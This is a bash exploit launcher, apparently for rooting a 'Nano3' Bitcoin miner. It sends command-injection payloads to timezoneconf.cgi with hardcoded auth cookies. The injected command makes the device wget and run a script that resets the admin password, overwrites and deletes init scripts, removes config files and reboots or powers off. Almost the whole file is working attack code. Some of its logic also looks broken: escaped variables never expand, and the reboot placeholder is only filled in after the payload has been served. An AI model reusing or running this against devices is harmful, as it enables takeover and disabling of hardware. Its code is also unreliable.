#!/bin/bash
####################################################################
# Nano3 Deployment / Exploit Launcher (for controlled testing)
#
# Description:
#   - Builds a small payload ("rootnano") and serves it from a
#     local HTTP server on the host.
#   - Attempts to trigger the payload on a target Nano3 device by
#     sending specially‑crafted POST requests to timezoneconf.cgi
#     using a list of known authentication cookies.
#   - If successful, the payload on the miner will:
#       * change the admin password,
#       * generate an SSH host key,
#       * overwrite /etc/init.d/rcS, S50nanowatch and S99btcminer
#         with files served from the host,
#       * delete /etc/init.d/S40network and /etc/init.d/S80swupdate,
#       * remove two configuration files and then either reboot or
#         power‑off the miner (depending on user choice).
#
# NOTE: This script performs privileged actions on the target device.
# Use only in authorized, controlled environments and with explicit
# permission. Review and approve any files in tools/ before serving.
####################################################################

# ------------------------------------------------------------------
# Path to rcS file
# ------------------------------------------------------------------
RCS_FILE="./tools/rcS"

# ------------------------------------------------------------------
# Read values from rcS
# ------------------------------------------------------------------
nano3_pool=$(grep '^nano3_pool=' "$RCS_FILE" | cut -d'"' -f2)
wifiname=$(grep '^wifiname=' "$RCS_FILE" | cut -d'"' -f2)
wifipass=$(grep '^wifipass=' "$RCS_FILE" | cut -d'"' -f2)
btc_address=$(grep '^btc_address=' "$RCS_FILE" | cut -d'"' -f2)

# ------------------------------------------------------------------
# Configuration
# ------------------------------------------------------------------
SERVER_PORT=8080
LOCAL_IP=$(hostname -I | awk '{print $1}')        # local IP of your PC
BASE_DIR="$(dirname "$0")"                         # directory where this script resides
TOOLS_DIR="$BASE_DIR/tools"
SCRIPT_PATH="$TOOLS_DIR/rootnano"
DEST_DIR="/etc/init.d"

# ------------------------------------------------------------------
# Basic validations
# ------------------------------------------------------------------
if [[ -z "$nano3_pool" || -z "$wifiname" || -z "$wifipass" || -z "$btc_address" ]]; then
    echo "Error: rcS contains empty fields. Please fill nano3_pool, wifiname, wifipass and btc_address before proceeding."
    exit 1
fi

echo "All fields are filled. Continuing..."

if [ ! -d "$TOOLS_DIR" ]; then
    echo "ERROR: the directory $TOOLS_DIR does not exist"
    echo "Create a 'tools' folder next to this script and place rcS and S99btcminer inside."
    exit 1
fi

for f in rcS S99btcminer; do
    if [ ! -f "$TOOLS_DIR/$f" ]; then
        echo "ERROR: $TOOLS_DIR/$f not found"
        exit 1
    fi
done

echo "rcS and S99btcminer detected in $TOOLS_DIR"

# ------------------------------------------------------------------
# Ask for the Nano3 device IP
# ------------------------------------------------------------------
while [[ -z "$NANO3_IP" ]]; do
    read -p "Enter the Nano3 device IP: " NANO3_IP
done

# ------------------------------------------------------------------
# rootnano payload that will run on the miner
# ------------------------------------------------------------------
cat << 'EOF' > "$SCRIPT_PATH"
#!/bin/sh

LOG_FILE="/opt/pwned.log"

log() {
    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1" >> "\$LOG_FILE"
}

log "=== rootnano started from \$LOCAL_IP ==="

# Change admin password to "admin"
echo -ne "admin\nadmin\n" | passwd admin >/dev/null 2>&1
log "Admin password changed to 'admin'."

# Generate ED25519 SSH host key
yes | ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N '' >/dev/null 2>&1
log "Hostkey SSH ed25519 generated."

# --------------------------------------------------------------------
# Download and overwrite custom init scripts
# --------------------------------------------------------------------
DEST_DIR="/etc/init.d"

# rcS
if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/rcS -O "\$DEST_DIR/rcS"; then
    chmod +x "\$DEST_DIR/rcS"
    log "rcS installed from tools."
else
    log "ERROR: Could not download rcS."
fi

# S50nanowatch
if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/S50nanowatch -O "\$DEST_DIR/S50nanowatch"; then
    chmod +x "\$DEST_DIR/S50nanowatch"
    log "S50nanowatch installed from tools."
else
    log "ERROR: Could not download S50nanowatch."
fi

# S99btcminer
if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/S99btcminer -O "\$DEST_DIR/S99btcminer"; then
    chmod +x "\$DEST_DIR/S99btcminer"
    log "S99btcminer installed from tools."
else
    log "ERROR: S99btcminer could not be downloaded."
fi

# --------------------------------------------------------------------
# Delete unwanted init scripts
# --------------------------------------------------------------------
for f in S40network S80swupdate; do
    if rm -f "\$DEST_DIR/\$f"; then
        log "Deleted \$f."
    else
        log "ERROR: Could not delete \$f (possibly it did not exist)."
    fi
done

# --------------------------------------------------------------------
# Final actions – the placeholder below will be replaced by the operator
# --------------------------------------------------------------------
log "Executing ACTION on miner..."
rm /data/usrcon/cgminer.ini
rm /data/usrcon/systemcfg.ini
sync
REBOOT_ACTION
EOF

chmod +x "$SCRIPT_PATH"

# ------------------------------------------------------------------
# Start HTTP server to serve rootnano and tools/
# ------------------------------------------------------------------
cd "$BASE_DIR"
echo "Starting server at http://$LOCAL_IP:$SERVER_PORT/"
python3 -m http.server "$SERVER_PORT" >/dev/null 2>&1 &
SERVER_PID=$!

sleep 2   # give the server a moment to start

# ------------------------------------------------------------------
# Attempt exploit with possible authentication keys
# ------------------------------------------------------------------
AUTH_KEYS=(
  "ff0000ff4813494d137e1631bba301d5"   # default key
  "ff0000ffe489f84c23a6fbd9017f631a"   # alternative key
)

SUCCESS=0
for AUTH in "${AUTH_KEYS[@]}"; do
    echo "Testing exploit with auth=$AUTH ..."
    RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/curl.out \
      "http://$NANO3_IP/timezoneconf.cgi" \
      -b "auth=$AUTH" \
      --data-raw "timezone=%3Bwget%20http%3A%2F%2F$LOCAL_IP%3A$SERVER_PORT%2Ftools%2Frootnano%20-O%20%2Ftmp%2Frootnano%3Bsh%20%2Ftmp%2Frootnano%3B")

    if [ "$RESPONSE" = "200" ]; then
        echo "Exploit launched successfully with auth=$AUTH"
        SUCCESS=1
        break
    else
        echo "Failed with auth=$AUTH (HTTP $RESPONSE), trying next..."
    fi
done

# ------------------------------------------------------------------
# Stop HTTP server
# ------------------------------------------------------------------
kill "$SERVER_PID" 2>/dev/null || true
echo "Server stopped."

# ------------------------------------------------------------------
# Final actions – ask the operator what to do next
# ------------------------------------------------------------------
if [ $SUCCESS -eq 1 ]; then
    read -p "Do you want the miner to reboot (r) or power‑off (p)? [r/p]: " choice
    case "$choice" in
        [Rr]* ) ACTION="reboot"; echo "You chose to reboot the miner." ;;
        [Pp]* ) ACTION="poweroff"; echo "You chose to power‑off the miner." ;;
        * )   ACTION="reboot"; echo "No valid choice made – defaulting to reboot." ;;
    esac

    # Replace the placeholder in the payload with the chosen command
    sed -i "s/REBOOT_ACTION/\/usr\/sbin\/\$ACTION/" "$SCRIPT_PATH"
else
    echo "None of the auth keys worked, check manually."
fi
